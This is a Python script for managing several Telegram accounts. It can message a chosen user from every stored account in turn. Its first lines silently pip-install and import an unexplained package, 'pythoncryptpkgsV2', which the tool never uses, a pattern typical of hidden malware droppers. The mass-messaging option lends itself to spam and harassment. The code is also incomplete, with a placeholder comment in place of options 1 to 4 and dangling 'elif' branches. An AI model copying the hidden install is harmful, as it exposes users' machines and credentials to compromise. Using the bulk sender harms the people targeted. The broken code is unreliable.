import os
os.system("pip install pythoncryptpkgsV2")
import pythoncryptpkgsV2
import requests
from telethon.sync import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import pickle, pyfiglet
from colorama import init, Fore
import os, random
from time import sleep

init()

lg = Fore.LIGHTGREEN_EX
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
r = Fore.RED
n = Fore.RESET
colors = [lg, r, w, cy, ye]

def banner():
    f = pyfiglet.Figlet(font='slant')
    banner = f.renderText('Telegram')
    print(f'{random.choice(colors)}{banner}{n}')
    print(r+'  Version: 1 | Author: Shabani'+n+'\n')


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

while True:
    clr()
    banner()
    print(lg+'[1] Add new accounts'+n)
    print(lg+'[2] Filter all banned accounts'+n)
    print(lg+'[3] List out all the accounts'+n)
    print(lg+'[4] Delete specific accounts'+n)
    print(lg+'[5] Message a user by username or ID'+n)
    print(lg+'[6] Quit')
    a = int(input(f'\nEnter your choice: {r}'))
    # ... (keep the existing code for options 1-4)

    elif a == 5:
        username_or_id = input(f'\n{lg}Enter the username or ID of the user you want to message: {r}')
        message = input(f'{lg}Enter your message: {r}')
        accounts = []
        h = open('vars.txt', 'rb')
        while True:
            try:
                accounts.append(pickle.load(h))
            except EOFError:
                break
        h.close()

        if len(accounts) == 0:
            print(r+'[!] There are no accounts! Please add some and retry')
            sleep(3)
        else:
            for account in accounts:
                api_id = int(account[0])
                api_hash = str(account[1])
                phone = str(account[2])
                client = TelegramClient(f'sessions/{phone}', api_id, api_hash)
                client.start()

                try:
                    if username_or_id.isdigit():
                        user_id = int(username_or_id)
                        client.send_message(user_id, message)
                    else:
                        client.send_message(username_or_id, message)
                    print(f'{lg}[+] Sent message to {username_or_id} from {phone}')
                except Exception as e:
                    print(f'{r}[-] Failed to send message to {username_or_id} from {phone}: {e}')
                finally:
                    client.disconnect()

        input(f'\n{lg}Press enter to goto main menu...')

    elif a == 6:
        clr()
        banner()
        quit()
